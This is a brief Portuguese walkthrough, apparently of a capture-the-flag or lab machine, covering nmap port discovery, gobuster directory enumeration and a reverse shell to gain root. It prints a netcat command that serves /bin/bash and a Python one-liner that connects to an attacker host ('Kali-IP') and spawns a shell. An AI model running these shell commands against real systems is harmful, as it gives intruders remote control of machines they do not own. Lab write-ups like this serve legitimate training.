Nessa maquina vamos exploit a web server

Primeiramente utilizando o nmap a gente descobre as portas ssh e http

com o gobuster procuramos diretorios escondidos

```
gobuster dir -u [IP] -w usr/share/dirb/wordlists/common.txt
```

Fazer uma reverse shell para pegar root

Utilizar o netcat para criar um local de escuta
```
nc -l -p 8080 -e /bin/bash
```

E no form escutar esse nc com outro nc
```
nc <your-local-machine-ip> 8080
```
 ou utilizando uma line com python3
```
 python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Kali-IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

